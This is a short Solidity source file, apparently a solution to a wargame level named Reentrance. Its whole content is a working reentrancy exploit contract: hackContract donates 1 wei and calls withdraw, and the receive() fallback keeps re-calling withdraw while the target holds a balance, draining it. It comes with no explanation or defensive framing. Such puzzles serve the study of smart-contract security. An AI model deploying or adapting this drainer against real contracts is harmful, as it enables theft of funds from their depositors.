// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

interface IReentrance {
    function donate(address) external payable;
    function withdraw() external;
}

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        if(address(contractAddress).balance > 0 ) {
            IReentrance(contractAddress).withdraw();
        }
    }

    function hackContract() external {
        // Donate some ETH
        IReentrance(contractAddress).donate{value: 1}(address(this));
        // Initiate drainage
        IReentrance(contractAddress).withdraw();
    }

}
